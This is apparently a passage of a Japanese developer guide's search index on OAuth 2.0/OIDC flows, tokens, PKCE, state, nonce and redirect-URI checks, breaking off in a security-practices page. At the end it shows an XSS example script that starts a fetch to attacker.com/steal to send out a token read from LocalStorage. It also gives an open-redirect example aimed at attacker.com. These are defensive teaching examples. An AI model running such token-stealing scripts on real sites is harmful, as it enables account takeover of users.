\u8a8d\u8a3c(\u672c\u4eba\u78ba\u8a8d) \u4e3b\u306a\u30c8\u30fc\u30af\u30f3 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 ID\u30c8\u30fc\u30af\u30f3 + \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 \u53d6\u5f97\u60c5\u5831 \u30ea\u30bd\u30fc\u30b9\u3078\u306e\u30a2\u30af\u30bb\u30b9\u6a29 \u30e6\u30fc\u30b6\u30fc\u60c5\u5831 \u7528\u9014 API \u30a2\u30af\u30bb\u30b9 \u30ed\u30b0\u30a4\u30f3\u3001\u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u53d6\u5f97"},{"location":"oauth-oidc-basics/#idjwt","title":"ID\u30c8\u30fc\u30af\u30f3\u306e\u4e2d\u8eab(JWT\u5f62\u5f0f)","text":"<pre><code>{\n  \"iss\": \"https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_xxxxx\",\n  \"sub\": \"12345678-1234-1234-1234-123456789012\",\n  \"aud\": \"your-client-id\",\n  \"exp\": 1616239022,\n  \"iat\": 1616235422,\n  \"email\": \"user@example.com\",\n  \"email_verified\": true,\n  \"name\": \"John Doe\",\n  \"cognito:groups\": [\"Admin\", \"Users\"]\n}\n</code></pre> <ul> <li>iss (issuer): \u767a\u884c\u8005</li> <li>sub (subject): \u30e6\u30fc\u30b6\u30fcID</li> <li>aud (audience): \u60f3\u5b9a\u53d7\u4fe1\u8005(\u30af\u30e9\u30a4\u30a2\u30f3\u30c8ID)</li> <li>exp (expiration): \u6709\u52b9\u671f\u9650</li> <li>iat (issued at): \u767a\u884c\u6642\u523b</li> </ul>"},{"location":"oauth-oidc-basics/#_8","title":"\u30d5\u30ed\u30fc\u306e\u7a2e\u985e\u3068\u9078\u629e","text":""},{"location":"oauth-oidc-basics/#oauth-20-oidc","title":"OAuth 2.0 / OIDC \u306e\u4e3b\u8981\u30d5\u30ed\u30fc","text":""},{"location":"oauth-oidc-basics/#1-authorization-code-flow","title":"1. Authorization Code Flow(\u8a8d\u53ef\u30b3\u30fc\u30c9\u30d5\u30ed\u30fc) \u2705 \u63a8\u5968","text":"<p>\u6700\u3082\u5b89\u5168\u306a\u30d5\u30ed\u30fc\u3002\u3059\u3079\u3066\u306e\u72b6\u6cc1\u3067\u63a8\u5968\u3002</p> <pre><code>sequenceDiagram\n    participant Browser\n    participant Client\n    participant AuthServer\n\n    Browser-&gt;&gt;AuthServer: 1. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8(redirect)\n    AuthServer-&gt;&gt;Browser: 2. \u8a8d\u53ef\u30b3\u30fc\u30c9(redirect)\n    Browser-&gt;&gt;Client: 3. \u8a8d\u53ef\u30b3\u30fc\u30c9\u3092\u6e21\u3059\n    Client-&gt;&gt;AuthServer: 4. \u8a8d\u53ef\u30b3\u30fc\u30c9 + \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b7\u30fc\u30af\u30ec\u30c3\u30c8\n    AuthServer-&gt;&gt;Client: 5. \u30c8\u30fc\u30af\u30f3\u767a\u884c</code></pre> <p>\u7279\u5fb4:</p> <ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u304c\u30d6\u30e9\u30a6\u30b6\u306b\u9732\u51fa\u3057\u306a\u3044</li> <li>\u2705 \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u3067\u30b5\u30fc\u30d0\u30fc\u8a8d\u8a3c</li> <li>\u2705 \u6700\u3082\u30bb\u30ad\u30e5\u30a2</li> </ul> <p>\u9069\u7528: \u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9\u30a2\u30d7\u30ea(Next.js SSR\u7b49)</p>"},{"location":"oauth-oidc-basics/#2-authorization-code-pkce-2025","title":"2. Authorization Code + PKCE \u2705 2025\u5e74\u6a19\u6e96","text":"<p>SPA\u3084\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3067\u5fc5\u9808\u3002OAuth 2.1\u306e\u6a19\u6e96\u30d5\u30ed\u30fc\u3002</p> <pre><code>sequenceDiagram\n    participant SPA\n    participant AuthServer\n\n    SPA-&gt;&gt;SPA: code_verifier\u751f\u6210\n    SPA-&gt;&gt;SPA: code_challenge = hash(code_verifier)\n    SPA-&gt;&gt;AuthServer: 1. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8(code_challenge)\n    AuthServer-&gt;&gt;SPA: 2. \u8a8d\u53ef\u30b3\u30fc\u30c9\n    SPA-&gt;&gt;AuthServer: 3. \u8a8d\u53ef\u30b3\u30fc\u30c9 + code_verifier\n    AuthServer-&gt;&gt;AuthServer: 4. code_verifier\u691c\u8a3c\n    AuthServer-&gt;&gt;SPA: 5. \u30c8\u30fc\u30af\u30f3\u767a\u884c</code></pre> <p>PKCE(Proof Key for Code Exchange)\u306e\u4ed5\u7d44\u307f:</p> <ol> <li>\u30e9\u30f3\u30c0\u30e0\u306a<code>code_verifier</code>\u3092\u751f\u6210</li> <li><code>code_challenge = SHA256(code_verifier)</code>\u3092\u8a08\u7b97</li> <li>\u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u306b<code>code_challenge</code>\u3092\u542b\u3081\u308b</li> <li>\u30c8\u30fc\u30af\u30f3\u53d6\u5f97\u6642\u306b<code>code_verifier</code>\u3092\u9001\u4fe1</li> <li>\u30b5\u30fc\u30d0\u30fc\u304c\u691c\u8a3c: <code>SHA256(code_verifier) == code_challenge</code></li> </ol> <p>\u7279\u5fb4:</p> <ul> <li>\u2705 \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b7\u30fc\u30af\u30ec\u30c3\u30c8\u4e0d\u8981</li> <li>\u2705 \u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u6b62</li> <li>\u2705 \u30d1\u30d6\u30ea\u30c3\u30af\u30af\u30e9\u30a4\u30a2\u30f3\u30c8(SPA/Mobile)\u3067\u3082\u5b89\u5168</li> </ul> <p>\u9069\u7528: SPA\u3001\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3001\u3059\u3079\u3066\u306e\u74b0\u5883</p>"},{"location":"oauth-oidc-basics/#3-implicit-flow","title":"3. Implicit Flow \u274c \u5ec3\u6b62","text":"<p>\u26a0\ufe0f OAuth 2.1\u3067\u5ec3\u6b62\u3002\u4f7f\u7528\u7981\u6b62\u3002</p> <pre><code>sequenceDiagram\n    participant SPA\n    participant AuthServer\n\n    SPA-&gt;&gt;AuthServer: 1. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\n    AuthServer-&gt;&gt;SPA: 2. \u30c8\u30fc\u30af\u30f3\u3092\u76f4\u63a5\u8fd4\u5374(URL\u30d5\u30e9\u30b0\u30e1\u30f3\u30c8)</code></pre> <p>\u554f\u984c\u70b9:</p> <ul> <li>\u274c \u30c8\u30fc\u30af\u30f3\u304c\u30d6\u30e9\u30a6\u30b6\u5c65\u6b74\u306b\u6b8b\u308b</li> <li>\u274c JavaScript\u3067\u53d6\u5f97(XSS\u8106\u5f31)</li> <li>\u274c \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u304c\u4f7f\u3048\u306a\u3044</li> </ul> <p>\u4ee3\u66ff: Authorization Code + PKCE</p>"},{"location":"oauth-oidc-basics/#4-client-credentials-flow","title":"4. Client Credentials Flow","text":"<p>\u30b5\u30fc\u30d0\u30fc\u9593\u901a\u4fe1(M2M)\u5c02\u7528\u3002</p> <pre><code>sequenceDiagram\n    participant ServiceA\n    participant AuthServer\n    participant ServiceB\n\n    ServiceA-&gt;&gt;AuthServer: 1. \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u8a8d\u8a3c\u60c5\u5831\n    AuthServer-&gt;&gt;ServiceA: 2. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\n    ServiceA-&gt;&gt;ServiceB: 3. \u30c8\u30fc\u30af\u30f3\u4ed8\u304d\u30ea\u30af\u30a8\u30b9\u30c8</code></pre> <p>\u7279\u5fb4:</p> <ul> <li>\u30e6\u30fc\u30b6\u30fc\u304c\u4ecb\u5728\u3057\u306a\u3044</li> <li>\u30b5\u30fc\u30d0\u30fc\u540c\u58eb\u306e\u901a\u4fe1</li> </ul> <p>\u9069\u7528: \u30d0\u30c3\u30c1\u51e6\u7406\u3001\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u9593\u901a\u4fe1</p>"},{"location":"oauth-oidc-basics/#5-device-authorization-grant","title":"5. Device Authorization Grant(\u30c7\u30d0\u30a4\u30b9\u30b3\u30fc\u30c9\u30d5\u30ed\u30fc)","text":"<p>\u5165\u529b\u304c\u56f0\u96e3\u306a\u30c7\u30d0\u30a4\u30b9\u7528\u3002</p> <pre><code>sequenceDiagram\n    participant TV\n    participant AuthServer\n    participant Browser\n\n    TV-&gt;&gt;AuthServer: 1. \u30c7\u30d0\u30a4\u30b9\u30b3\u30fc\u30c9\u8981\u6c42\n    AuthServer-&gt;&gt;TV: 2. \u30c7\u30d0\u30a4\u30b9\u30b3\u30fc\u30c9 + URL\n    TV-&gt;&gt;TV: 3. QR\u30b3\u30fc\u30c9/URL\u3092\u753b\u9762\u8868\u793a\n    Browser-&gt;&gt;AuthServer: 4. URL\u306b\u30a2\u30af\u30bb\u30b9\u3057\u3066\u30ed\u30b0\u30a4\u30f3\n    TV-&gt;&gt;AuthServer: 5. \u30dd\u30fc\u30ea\u30f3\u30b0(\u30c8\u30fc\u30af\u30f3\u53d6\u5f97)</code></pre> <p>\u9069\u7528: \u30b9\u30de\u30fc\u30c8TV\u3001IoT\u30c7\u30d0\u30a4\u30b9\u3001CLI</p>"},{"location":"oauth-oidc-basics/#2025","title":"\u30d5\u30ed\u30fc\u9078\u629e\u30c1\u30e3\u30fc\u30c8(2025\u5e74\u7248)","text":"<pre><code>graph TD\n    Start[\u8a8d\u8a3c\u30d5\u30ed\u30fc\u3092\u9078\u3076] --&gt; Q1{\u30e6\u30fc\u30b6\u30fc\u304c\u3044\u308b?}\n    Q1 --&gt;|\u3044\u3044\u3048| M2M[Client Credentials]\n    Q1 --&gt;|\u306f\u3044| Q2{\u30c7\u30d0\u30a4\u30b9\u306e\u7a2e\u985e\u306f?}\n    Q2 --&gt;|Web\u30d6\u30e9\u30a6\u30b6| Q3{\u5b9f\u88c5\u65b9\u5f0f\u306f?}\n    Q3 --&gt;|\u30b5\u30fc\u30d0\u30fc\u30b5\u30a4\u30c9| Code[Authorization Code]\n    Q3 --&gt;|SPA| PKCE[Authorization Code + PKCE]\n    Q2 --&gt;|\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea| PKCE\n    Q2 --&gt;|TV/IoT| Device[Device Authorization Grant]</code></pre>"},{"location":"oauth-oidc-basics/#_9","title":"\u30c8\u30fc\u30af\u30f3\u306e\u7a2e\u985e","text":""},{"location":"oauth-oidc-basics/#1-access-token","title":"1. \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3(Access Token)","text":"<p>\u7528\u9014: API\u30a2\u30af\u30bb\u30b9\u306e\u8a8d\u53ef</p> <pre><code>GET /api/users/profile HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...\n</code></pre> <p>\u7279\u5fb4:</p> <ul> <li>\u77ed\u547d(15\u5206\u301c1\u6642\u9593)</li> <li>\u30b9\u30b3\u30fc\u30d7(\u6a29\u9650)\u3092\u542b\u3080</li> <li>JWT \u307e\u305f\u306f Opaque Token</li> </ul> <p>\u691c\u8a3c\u9805\u76ee:</p> <ul> <li>\u2705 \u7f72\u540d\u306e\u6b63\u5f53\u6027</li> <li>\u2705 \u6709\u52b9\u671f\u9650(exp)</li> <li>\u2705 \u767a\u884c\u8005(iss)</li> <li>\u2705 \u5bfe\u8c61\u8005(aud)</li> <li>\u2705 \u30b9\u30b3\u30fc\u30d7</li> </ul>"},{"location":"oauth-oidc-basics/#2-refresh-token","title":"2. \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3(Refresh Token)","text":"<p>\u7528\u9014: \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u306e\u518d\u767a\u884c</p> <pre><code>POST /oauth2/token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=refresh_token&amp;\nrefresh_token=xyz123...&amp;\nclient_id=your-client-id\n</code></pre> <p>\u7279\u5fb4:</p> <ul> <li>\u9577\u547d(7\u301c30\u65e5)</li> <li>1\u56de\u9650\u308a\u4f7f\u7528(\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\u63a8\u5968)</li> <li>\u4e0d\u900f\u660e\u30c8\u30fc\u30af\u30f3</li> </ul> <p>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56:</p> <ul> <li>\u2705 HttpOnly Cookie \u306b\u4fdd\u5b58</li> <li>\u2705 \u4f7f\u7528\u5f8c\u306f\u65b0\u3057\u3044\u30c8\u30fc\u30af\u30f3\u3068\u4ea4\u63db</li> <li>\u2705 \u518d\u5229\u7528\u691c\u77e5\u3067\u5168\u30c8\u30fc\u30af\u30f3\u7121\u52b9\u5316</li> </ul>"},{"location":"oauth-oidc-basics/#3-idid-token-oidc","title":"3. ID\u30c8\u30fc\u30af\u30f3(ID Token) - OIDC\u5c02\u7528","text":"<p>\u7528\u9014: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u306e\u53d6\u5f97\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3067\u306e\u8a8d\u8a3c\u78ba\u8a8d</p> <pre><code>// ID\u30c8\u30fc\u30af\u30f3\u304b\u3089\u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3092\u53d6\u5f97\nconst decoded = jwt.decode(idToken);\nconsole.log(decoded.email);  // \"user@example.com\"\nconsole.log(decoded.name);   // \"John Doe\"\n</code></pre> <p>\u7279\u5fb4:</p> <ul> <li>JWT\u5f62\u5f0f(\u5fc5\u9808)</li> <li>\u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3092\u542b\u3080</li> <li>API\u8a8d\u8a3c\u306b\u306f**\u4f7f\u7528\u3057\u306a\u3044**(\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u3092\u4f7f\u7528)</li> </ul> <p>\u691c\u8a3c\u9805\u76ee:</p> <ul> <li>\u2705 \u7f72\u540d\u306e\u6b63\u5f53\u6027</li> <li>\u2705 \u6709\u52b9\u671f\u9650(exp)</li> <li>\u2705 \u767a\u884c\u8005(iss)</li> <li>\u2705 \u5bfe\u8c61\u8005(aud) - \u30af\u30e9\u30a4\u30a2\u30f3\u30c8ID</li> <li>\u2705 nonce(\u30ea\u30d7\u30ec\u30a4\u653b\u6483\u5bfe\u7b56)</li> </ul>"},{"location":"oauth-oidc-basics/#_10","title":"\u30c8\u30fc\u30af\u30f3\u306e\u4f7f\u3044\u5206\u3051","text":"\u30c8\u30fc\u30af\u30f3 \u7528\u9014 \u9001\u4fe1\u5148 \u6709\u52b9\u671f\u9650 \u5f62\u5f0f \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 API\u547c\u3073\u51fa\u3057 \u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0\u30fc \u77ed\u3044(15\u5206\u301c1\u6642\u9593) JWT/Opaque \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3 \u30c8\u30fc\u30af\u30f3\u518d\u767a\u884c \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc \u9577\u3044(7\u301c30\u65e5) Opaque ID\u30c8\u30fc\u30af\u30f3 \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u53d6\u5f97 \u30af\u30e9\u30a4\u30a2\u30f3\u30c8 \u77ed\u3044(1\u6642\u9593) JWT"},{"location":"oauth-oidc-basics/#_11","title":"\u91cd\u8981\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd","text":""},{"location":"oauth-oidc-basics/#1-pkceproof-key-for-code-exchange","title":"1. PKCE(Proof Key for Code Exchange)","text":"<p>\u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u3050\u3002</p>"},{"location":"oauth-oidc-basics/#pkce","title":"\u653b\u6483\u30b7\u30ca\u30ea\u30aa(PKCE\u306a\u3057)","text":"<pre><code>1. \u6b63\u898f\u30a2\u30d7\u30ea\u304c\u8a8d\u53ef\u30b3\u30fc\u30c9\u3092\u53d7\u3051\u53d6\u308b\n2. \u60aa\u610f\u3042\u308b\u30a2\u30d7\u30ea\u304cURL\u304b\u3089\u8a8d\u53ef\u30b3\u30fc\u30c9\u3092\u76d7\u3080\n3. \u60aa\u610f\u3042\u308b\u30a2\u30d7\u30ea\u304c\u30c8\u30fc\u30af\u30f3\u3092\u53d6\u5f97\n</code></pre>"},{"location":"oauth-oidc-basics/#pkce_1","title":"PKCE \u306b\u3088\u308b\u9632\u6b62","text":"<pre><code>1. \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u6642: code_challenge \u3092\u9001\u4fe1\n2. \u30c8\u30fc\u30af\u30f3\u53d6\u5f97\u6642: code_verifier \u3092\u9001\u4fe1\n3. \u30b5\u30fc\u30d0\u30fc\u304c\u691c\u8a3c: hash(code_verifier) == code_challenge\n4. \u4e00\u81f4\u3057\u306a\u3044\u5834\u5408\u306f\u30c8\u30fc\u30af\u30f3\u767a\u884c\u62d2\u5426\n</code></pre> <p>\u5fc5\u9808\u74b0\u5883: SPA\u3001\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3001OAuth 2.1\u6e96\u62e0\u306e\u5168\u74b0\u5883</p>"},{"location":"oauth-oidc-basics/#2-state","title":"2. state \u30d1\u30e9\u30e1\u30fc\u30bf","text":"<p>CSRF\u653b\u6483\u3092\u9632\u3050\u3002</p>"},{"location":"oauth-oidc-basics/#state","title":"\u653b\u6483\u30b7\u30ca\u30ea\u30aa(state\u306a\u3057)","text":"<pre><code>1. \u653b\u6483\u8005\u304c\u81ea\u5206\u306e\u30a2\u30ab\u30a6\u30f3\u30c8\u3067\u8a8d\u53ef\u30d5\u30ed\u30fc\u3092\u958b\u59cb\n2. \u8a8d\u53ef\u30b3\u30fc\u30c9\u3092\u542b\u3080\u30b3\u30fc\u30eb\u30d0\u30c3\u30afURL\u3092\u88ab\u5bb3\u8005\u306b\u9001\u4fe1\n3. \u88ab\u5bb3\u8005\u304c\u30af\u30ea\u30c3\u30af \u2192 \u653b\u6483\u8005\u306e\u30a2\u30ab\u30a6\u30f3\u30c8\u306b\u30ed\u30b0\u30a4\u30f3\n4. \u88ab\u5bb3\u8005\u306e\u64cd\u4f5c\u304c\u653b\u6483\u8005\u306e\u30a2\u30ab\u30a6\u30f3\u30c8\u306b\u8a18\u9332\u3055\u308c\u308b\n</code></pre>"},{"location":"oauth-oidc-basics/#state_1","title":"state \u306b\u3088\u308b\u9632\u6b62","text":"<pre><code>// \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u524d\nconst state = generateRandomString();\nsessionStorage.setItem('oauth_state', state);\nlocation.href = `${authUrl}?state=${state}&amp;...`;\n\n// \u30b3\u30fc\u30eb\u30d0\u30c3\u30af\u6642\nconst returnedState = new URLSearchParams(location.search).get('state');\nconst savedState = sessionStorage.getItem('oauth_state');\n\nif (returnedState !== savedState) {\n  throw new Error('State mismatch - possible CSRF attack');\n}\n</code></pre> <p>\u5fc5\u9808\u74b0\u5883: \u3059\u3079\u3066\u306e OAuth/OIDC \u5b9f\u88c5</p>"},{"location":"oauth-oidc-basics/#3-nonce-oidc","title":"3. nonce \u30d1\u30e9\u30e1\u30fc\u30bf(OIDC)","text":"<p>ID\u30c8\u30fc\u30af\u30f3\u306e\u30ea\u30d7\u30ec\u30a4\u30a2\u30bf\u30c3\u30af \u3092\u9632\u3050\u3002</p> <pre><code>// \u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u524d\nconst nonce = generateRandomString();\nsessionStorage.setItem('oidc_nonce', nonce);\nlocation.href = `${authUrl}?nonce=${nonce}&amp;...`;\n\n// ID\u30c8\u30fc\u30af\u30f3\u691c\u8a3c\u6642\nconst decoded = jwt.decode(idToken);\nconst savedNonce = sessionStorage.getItem('oidc_nonce');\n\nif (decoded.nonce !== savedNonce) {\n  throw new Error('Nonce mismatch - possible replay attack');\n}\n</code></pre> <p>\u5fc5\u9808\u74b0\u5883: OpenID Connect \u4f7f\u7528\u6642</p>"},{"location":"oauth-oidc-basics/#4-uri","title":"4. \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u306e\u53b3\u683c\u306a\u691c\u8a3c","text":"<p>\u30aa\u30fc\u30d7\u30f3\u30ea\u30c0\u30a4\u30ec\u30af\u30bf\u653b\u6483\u3092\u9632\u3050\u3002</p>"},{"location":"oauth-oidc-basics/#_12","title":"\u60aa\u3044\u4f8b","text":"<pre><code>// \u274c \u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u8a31\u53ef\nallowed_redirect_uris: [\"https://example.com/*\"]\n\n// \u653b\u6483\u8005\u304c\u60aa\u7528\nhttps://example.com/evil-redirect?target=https://attacker.com\n</code></pre>"},{"location":"oauth-oidc-basics/#_13","title":"\u826f\u3044\u4f8b","text":"<pre><code>// \u2705 \u5b8c\u5168\u4e00\u81f4\u306e\u307f\nallowed_redirect_uris: [\n  \"https://example.com/callback\",\n  \"http://localhost:3000/api/auth/callback/cognito\"\n]\n</code></pre> <p>\u30eb\u30fc\u30eb:</p> <ul> <li>\u2705 \u5b8c\u5168\u4e00\u81f4\u306e\u307f\u8a31\u53ef</li> <li>\u274c \u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62</li> <li>\u274c \u90e8\u5206\u4e00\u81f4\u7981\u6b62</li> </ul>"},{"location":"oauth-oidc-basics/#5","title":"5. \u30b9\u30b3\u30fc\u30d7\u306e\u6700\u5c0f\u6a29\u9650","text":"<p>\u5fc5\u8981\u6700\u5c0f\u9650\u306e\u6a29\u9650\u306e\u307f\u8981\u6c42\u3002</p>"},{"location":"oauth-oidc-basics/#_14","title":"\u60aa\u3044\u4f8b","text":"<pre><code>// \u274c \u904e\u5270\u306a\u6a29\u9650\nscope: \"openid profile email admin:all\"\n</code></pre>"},{"location":"oauth-oidc-basics/#_15","title":"\u826f\u3044\u4f8b","text":"<pre><code>// \u2705 \u5fc5\u8981\u6700\u5c0f\u9650\nscope: \"openid email\"  // \u30ed\u30b0\u30a4\u30f3\u3068\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u306e\u307f\n</code></pre>"},{"location":"oauth-oidc-basics/#oauth-20-vs-oauth-21","title":"OAuth 2.0 vs OAuth 2.1","text":""},{"location":"oauth-oidc-basics/#2025_1","title":"\u4e3b\u306a\u5909\u66f4\u70b9(2025\u5e74)","text":"\u9805\u76ee OAuth 2.0 OAuth 2.1 \u63a8\u5968\u30d5\u30ed\u30fc \u8907\u6570\u306e\u30d5\u30ed\u30fc Authorization Code + PKCE Implicit Flow \u8a31\u53ef \u5ec3\u6b62 ROPC \u8a31\u53ef \u5ec3\u6b62 PKCE \u30aa\u30d7\u30b7\u30e7\u30f3 \u5fc5\u9808 \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI \u90e8\u5206\u4e00\u81f4\u3082\u53ef \u5b8c\u5168\u4e00\u81f4\u5fc5\u9808 state \u63a8\u5968 \u5fc5\u9808 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3 \u518d\u5229\u7528\u53ef\u80fd \u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3\u63a8\u5968"},{"location":"oauth-oidc-basics/#_16","title":"\u307e\u3068\u3081","text":""},{"location":"oauth-oidc-basics/#_17","title":"\u899a\u3048\u3066\u304a\u304f\u3079\u304d\u91cd\u8981\u30dd\u30a4\u30f3\u30c8","text":"<ol> <li>OAuth 2.0 = \u8a8d\u53ef\u3001OIDC = \u8a8d\u8a3c</li> <li>2025\u5e74\u306e\u6a19\u6e96\u30d5\u30ed\u30fc = Authorization Code + PKCE</li> <li>Implicit Flow \u306f\u4f7f\u7528\u7981\u6b62</li> <li>\u30c8\u30fc\u30af\u30f3\u306f3\u7a2e\u985e: \u30a2\u30af\u30bb\u30b9\u3001\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u3001ID</li> <li>\u5fc5\u9808\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3: PKCE\u3001state\u3001nonce\u3001\u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u53b3\u683c\u691c\u8a3c</li> </ol>"},{"location":"oauth-oidc-basics/#_18","title":"\u6b21\u306e\u30b9\u30c6\u30c3\u30d7","text":"<p>\u57fa\u790e\u77e5\u8b58\u3092\u7406\u89e3\u3057\u305f\u3089\u3001\u4ee5\u4e0b\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306b\u9032\u3093\u3067\u304f\u3060\u3055\u3044:</p> <ol> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56\u306e\u8a73\u7d30</li> <li>\u5b9f\u88c5\u30ac\u30a4\u30c9 - Next.js + Spring Boot + Cognito \u306e\u5b9f\u88c5</li> </ol> <p>\u53c2\u8003\u8cc7\u6599:</p> <ul> <li>OAuth 2.0 RFC 6749</li> <li>OAuth 2.1 Draft</li> <li>OpenID Connect Core</li> <li>PKCE RFC 7636</li> </ul> <p>\u6700\u7d42\u66f4\u65b0: 2025\u5e7410\u670815\u65e5 \u5bfe\u8c61\u8aad\u8005: \u8a8d\u8a3c\u6a5f\u80fd\u306e\u5b9f\u88c5\u3092\u5b66\u3076\u958b\u767a\u8005(\u521d\u7d1a\u301c\u4e2d\u7d1a)</p>"},{"location":"security-practices/","title":"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56\u3068\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9","text":"<p>\ud83d\udee1\ufe0f \u8a8d\u8a3c\u30fb\u8a8d\u53ef &gt; \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3067\u306f\u3001\u8a8d\u8a3c\u5b9f\u88c5\u306b\u304a\u3051\u308b\u8105\u5a01\u3068\u5bfe\u7b56\u30012025\u5e74\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9\u3092\u307e\u3068\u3081\u3066\u3044\u307e\u3059\u3002XSS\u3001CSRF\u3001\u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u7b49\u306e\u5178\u578b\u7684\u306a\u653b\u6483\u624b\u6cd5\u3068\u3001\u305d\u308c\u3089\u306b\u5bfe\u3059\u308b\u5177\u4f53\u7684\u306a\u5bfe\u7b56\u3092\u89e3\u8aac\u3057\u307e\u3059\u3002</p>"},{"location":"security-practices/#_2","title":"\u524d\u63d0\u77e5\u8b58","text":"<ul> <li>\u6982\u8981 - \u8a8d\u8a3c\u30fb\u8a8d\u53ef\u306e\u57fa\u790e</li> <li>OAuth 2.0 / OIDC - \u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> </ul>"},{"location":"security-practices/#_3","title":"\u95a2\u9023\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>\u5b9f\u88c5: \u5b9f\u88c5\u30ac\u30a4\u30c9 - \u30bb\u30ad\u30e5\u30a2\u306a\u5b9f\u88c5\u65b9\u6cd5</li> <li>\u8a73\u7d30: \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 - \u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853</li> </ul>"},{"location":"security-practices/#_4","title":"\u76ee\u6b21","text":"<ol> <li>\u5178\u578b\u7684\u306a\u8105\u5a01\u3068\u5bfe\u7b56</li> <li>\u30c8\u30fc\u30af\u30f3\u7ba1\u7406\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9</li> <li>Cookie \u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8a2d\u5b9a</li> <li>\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853</li> <li>2025\u5e74\u306e\u91cd\u8981\u30c8\u30d4\u30c3\u30af</li> </ol>"},{"location":"security-practices/#_5","title":"\u5178\u578b\u7684\u306a\u8105\u5a01\u3068\u5bfe\u7b56","text":""},{"location":"security-practices/#1-xsscross-site-scripting","title":"1. XSS(Cross-Site Scripting)","text":""},{"location":"security-practices/#xss","title":"XSS\u306e\u653b\u6483\u5185\u5bb9","text":"<p>\u60aa\u610f\u3042\u308bJavaScript\u3092\u6ce8\u5165\u3057\u3001\u30c8\u30fc\u30af\u30f3\u3084Cookie\u3092\u76d7\u3080\u3002</p> <pre><code>&lt;!-- \u653b\u6483\u4f8b --&gt;\n&lt;script&gt;\n  // LocalStorage\u304b\u3089\u30c8\u30fc\u30af\u30f3\u3092\u76d7\u3080\n  fetch('https://attacker.com/steal', {\n    method: 